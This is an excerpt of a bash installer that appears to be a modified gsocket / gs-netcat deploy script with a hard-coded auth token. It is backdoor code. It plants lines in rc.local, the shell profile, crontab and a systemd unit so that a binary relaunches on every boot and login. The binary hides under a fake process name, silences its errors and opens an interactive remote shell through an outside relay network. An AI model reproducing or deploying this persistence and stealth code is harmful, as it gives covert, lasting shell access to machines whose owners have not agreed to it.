...
init_setup()
{
	...
	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; GSOCKET_AUTH=gobloklo exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
	...
	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" GSOCKET_AUTH=gobloklo exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"GSOCKET_AUTH=gobloklo exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
...
ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' GSOCKET_AUTH=gobloklo exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
...
test_network()
{
	...
	# when exec is used.
	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" GSOCKET_AUTH=gobloklo exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
	ret=$?
...
gs_start()
{
	...
	if [[ -n "$IS_NEED_START" ]]; then
		...
		# This does work:
		#     FOO="X=1" && (eval $FOO id)
		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" GSOCKET_AUTH=gobloklo exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
		IS_GS_RUNNING=1
	fi
}
